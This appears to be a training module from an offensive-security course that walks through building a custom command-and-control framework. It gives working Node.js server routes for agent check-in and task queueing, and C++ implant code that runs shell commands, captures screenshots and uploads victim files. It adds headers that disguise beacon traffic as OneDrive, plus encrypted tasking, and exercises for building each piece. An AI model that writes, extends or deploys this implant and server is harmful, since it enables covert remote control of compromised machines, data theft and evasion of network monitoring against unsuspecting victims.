# Module 20 — Custom C2 Framework

## What a C2 framework is

A C2 (Command and Control) framework is the infrastructure that:
- Manages multiple compromised machines (agents/implants)
- Sends commands to them
- Receives data (output, files, screenshots) back
- Tracks which agents are alive, when they last beaconed

Famous C2 frameworks: Cobalt Strike, Metasploit, Havoc, Sliver, Brute Ratel.
This module builds a minimal one from scratch so you understand every layer.

---

## 2. Architecture

```
┌─────────────────────────────────────────────────────┐
│  C2 Server (your VPS or attacker machine)           │
│                                                     │
│  ┌──────────────┐  ┌────────────────────────────┐  │
│  │  Team Server │  │  Web Server (Express/Nginx) │  │
│  │  (Node.js)   │  │  HTTPS listener             │  │
│  │              │  │  /beacon  ← agent check-in  │  │
│  │  agent store │  │  /task    ← get pending task│  │
│  │  task queue  │  │  /result  ← post task result│  │
│  │  result log  │  └────────────────────────────┘  │
│  └──────────────┘                                   │
│         ↑                                           │
│  ┌──────┴──────┐                                   │
│  │  Operator   │ (your terminal — sends commands)  │
│  └─────────────┘                                   │
└─────────────────────────────────────────────────────┘
               ↕  HTTPS
┌──────────────────────────────┐
│  Agent (implant running on   │
│  victim Windows machine)     │
│  Loop:                       │
│    1. POST /beacon (check-in) │
│    2. GET /task   (any work?) │
│    3. Execute task            │
│    4. POST /result            │
│    5. Sleep(jitter)           │
└──────────────────────────────┘
```

---

## 3. Agent Design (C++ side)

The agent we built in Module 09 is essentially a simple C2 client.
A production-grade agent adds:

1. **Task types** — shell command, file upload/download, screenshot,
   keylog dump, inject shellcode, load module
2. **Encrypted tasking** — tasks and results encrypted so a MITM on the
   network can't read them (use AES-256 with a key derived at registration)
3. **Jitter** — random sleep between beacons (60 ± 30 seconds is common)
4. **Malleable profile** — make HTTPS traffic look like a legitimate website
   (mimic Amazon S3, Google Analytics, Slack API in HTTP headers + URLs)
5. **Staged delivery** — small first-stage stager downloads the full agent

```cpp
// Task structure — matches JSON from server
struct Task {
    std::string id;      // UUID from server
    std::string type;    // "shell", "screenshot", "upload", "exit"
    std::string args;    // JSON args specific to type
};

// Result structure — sent back to server
struct TaskResult {
    std::string taskId;
    bool        success;
    std::string output;   // base64-encoded for binary (screenshots, files)
};
```

---

## 4. Task Protocol

```
Agent → POST /beacon
  Body: {"botId":"...", "os":"Windows 11", "user":"jsmith", "hostname":"WORKSTATION-14"}
  Response: {"taskId":"uuid1", "type":"shell", "args":{"cmd":"whoami"}}
            or {"type":"sleep"}  if no pending task

Agent → POST /result
  Body: {"taskId":"uuid1", "success":true, "output":"jsmith\\n"}

Operator → sends task via CLI:
  ./c2-cli.js --target WORKSTATION-14 --task shell --cmd "ipconfig /all"
  ./c2-cli.js --target WORKSTATION-14 --task screenshot
```

---

## 5. C2 Server (Node.js — already exists as foundation)

The `c2-server/` directory already has Express running. Extend it:

```javascript
// c2-server/routes/c2.js

const express   = require('express');
const router    = express.Router();
const { v4: uuidv4 } = require('uuid');

// In-memory store (replace with SQLite/Redis for production)
const agents = new Map();   // botId → {lastSeen, os, user, hostname}
const tasks  = new Map();   // botId → [{id, type, args}]
const results = [];

// Agent check-in + task pickup
router.post('/beacon', (req, res) => {
    const { botId, os, user, hostname } = req.body;
    agents.set(botId, { lastSeen: new Date(), os, user, hostname });

    const queue = tasks.get(botId) || [];
    if (queue.length > 0) {
        const task = queue.shift();
        tasks.set(botId, queue);
        return res.json(task);
    }
    res.json({ type: 'sleep', sleepMs: 30000 });
});

// Result from agent
router.post('/result', (req, res) => {
    results.push({ ...req.body, receivedAt: new Date() });
    console.log('[RESULT]', JSON.stringify(req.body).slice(0, 200));
    res.json({ ok: true });
});

// Operator: queue a task for a specific bot
router.post('/admin/task', (req, res) => {
    const { botId, type, args } = req.body;
    const queue = tasks.get(botId) || [];
    queue.push({ id: uuidv4(), type, args });
    tasks.set(botId, queue);
    res.json({ queued: true });
});

// Operator: list agents
router.get('/admin/agents', (req, res) => res.json([...agents.entries()]));

// Operator: list results
router.get('/admin/results', (req, res) => res.json(results.slice(-50)));

module.exports = router;
```

---

## 6. Making Traffic Blend In — Malleable C2 Profile

Headers that mimic legitimate traffic:

```cpp
// Instead of POST /beacon, use a profile like:
// POST /api/v1/telemetry
// User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120
// Content-Type: application/json; charset=utf-8
// Accept: application/json, text/plain, */*
// Origin: https://app.example.com
// Referer: https://app.example.com/dashboard

// The key principle: every request should look indistinguishable from
// legitimate SaaS API traffic to a network analyst.

void setMalleableHeaders(HINTERNET hRequest) {
    const char* headers =
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        "Accept: application/json, */*\r\n"
        "Content-Type: application/json\r\n"
        "Origin: https://onedrive.live.com\r\n"
        "Referer: https://onedrive.live.com/\r\n";
    HttpAddRequestHeadersA(hRequest, headers, (DWORD)-1L, HTTP_ADDREQ_FLAG_ADD);
}
```

---

## 7. Agent Task Execution Engine

```cpp
std::string executeTask(const Task& task) {
    if (task.type == "shell") {
        // Use CreateProcess + pipe to capture output (Module 05 sol01)
        return execShell(task.args);
    }
    if (task.type == "screenshot") {
        // Use GDI+ capture (Module 09 theory)
        auto bmp = captureScreen();
        return base64Encode(bmp);  // return as base64 string
    }
    if (task.type == "upload") {
        // Read a local file and return its contents base64-encoded
        return base64EncodeFile(task.args);
    }
    if (task.type == "download") {
        // Decode base64 from args and write to disk
        base64DecodeToFile(task.args, task.destPath);
        return "ok";
    }
    if (task.type == "exit") {
        ExitProcess(0);
    }
    return "unknown task type";
}
```

---

## 8. Registration + Key Exchange

On first beacon, derive a session key so all subsequent traffic is encrypted:

```
Agent → POST /register
  Body: {"botId":"...", "pubkey": "<agent RSA pubkey>"}
  Response: {"sessionKey": "<AES key encrypted with agent's pubkey>"}

All subsequent requests:
  Body: AES-256-CBC(JSON, sessionKey)  // encrypted blob
  Response: AES-256-CBC(JSON, sessionKey)
```

This means even if someone intercepts the HTTPS traffic (or if the cert is
invalid and accepted), they see only encrypted blobs.

---

## Exercises

- `ex01_c2_server_routes.js` — add /beacon, /result, /admin/task, /admin/agents to c2-server
- `ex02_agent_beacon.cpp` — C++ agent that POSTs beacon, parses task JSON, posts result
- `ex03_task_engine.cpp` — agent task dispatcher (shell, screenshot, upload, download)
- `ex04_malleable_profile.cpp` — add malleable HTTP headers to WinINet requests
